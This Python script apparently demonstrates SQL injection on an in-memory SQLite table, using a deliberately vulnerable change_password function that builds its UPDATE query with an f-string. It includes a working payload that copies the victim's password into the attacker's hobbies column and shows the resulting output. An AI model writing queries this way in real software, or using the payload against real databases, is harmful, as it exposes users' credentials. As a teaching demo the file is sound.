import sqlite3

# create in-memory database
with sqlite3.connect(":memory:") as c:

    # create user table with two users
    c.execute('CREATE TABLE users (name TEXT, password TEXT, hobbies TEXT)')
    c.execute('INSERT INTO users VALUES ("attacker", "1234", "hacking")')
    c.execute('INSERT INTO users VALUES ("victim", "victim\'s secret password", "fishing, biking")')

    def change_password(name, new_password):
        # this query is vulnerable to SQL injection
        query = f'UPDATE users SET password = "{new_password}" WHERE name = "{name}"'

        print("query:")
        print(query)
        print("")
        
        c.execute(query)

    change_password("attacker", '1234", hobbies = (SELECT password FROM users WHERE name = "victim") WHERE name = "attacker" --')

    rows = c.execute('SELECT * FROM USERS')

    print("users:")
    for user, password, hobbies in rows:
        print(f'{user}\'s hobbies: {hobbies}')
    
    # query:
    # UPDATE users SET password = "1234", hobbies = (SELECT password FROM users WHERE name = "victim") WHERE name = "attacker" --" WHERE name = "attacker"

    # users:
    # attacker's hobbies: victim's secret password
    # victim's hobbies: fishing, biking
